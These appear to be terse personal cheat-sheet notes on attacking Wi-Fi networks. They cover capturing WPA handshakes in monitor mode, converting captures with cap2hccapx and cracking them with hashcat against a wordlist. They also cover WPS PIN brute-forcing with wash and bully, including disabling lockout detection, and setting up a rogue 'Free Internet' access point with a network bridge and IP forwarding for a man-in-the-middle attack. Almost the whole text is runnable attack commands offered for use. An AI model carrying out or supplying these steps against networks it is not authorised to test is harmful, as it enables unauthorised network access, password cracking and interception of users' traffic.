option #1 > Select another network interface > 
option #2 > put interface in monitor mode

then option #5: Handshake/PMKID tools menu 

4.  Explore for targets (monitor mode needed) 

------------ (monitor mode needed for capturing) ------------- 
5.  Capture PMKID 
6.  Capture Handshake 
---------------------------------------------------------------
Pick 6

Got the handshake, Upload and convert a WPA / WPA2 pcap capture file to a hashcat capture fil

Online at https://hashcat.net/cap2hccapx/
or binary https://github.com/hashcat/hashcat-utils/releases 
#cap2hccapx.bin input.pcap output.hccapx [filter by essid] [additional network essid:bssid]

then use hashcat
hashcat64.exe -m 2500 27372_1613440944.hccapx D:\Shared\SecLists\fav_wordlist\fav_wordlist.txt

# Using wash command will start hopping through the wireless channels and will list discovered APs that support WPS
wash -i wlan0

# make sure the monitor mode is on
# once found the AP is vulnerable to the attack, using "bully" with the following command:
bully -b <BSSID> <interface> 
# BSSID is the target AP's MAC Address
# To disable lockout detection in bullyh and force it to continue the attack  but this is not recommended
bully -b <BSSID> -L <interface>
# -L switch is used to disable lockdown detection
# adding the delay to prevent lock out, values of 60 seconds or more are recommended for most APs
bully -b <BSSID> -1 <seconds> -2 <seconds> <interface>

#Man In The Middle Attack
1. Put the wireless interface to monitor mode
# airmon-ng start <interface>
2. Set up Access Point with the SSID like "Free Internet"
# airbase-ng -c <channel> -e "Free Internet" <interface>
3. Create a network bridge interface with the following commands:
# brctl addbr br0
# brctl addif br0 eth0
# brctl addif br0 at0

>>> if brctl not found, do the "sudo apt install bridge-utils

# ifconfig br0 <ip_address> up 
>> ip_address is based on the network configuration
3. Enable IP packet forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward
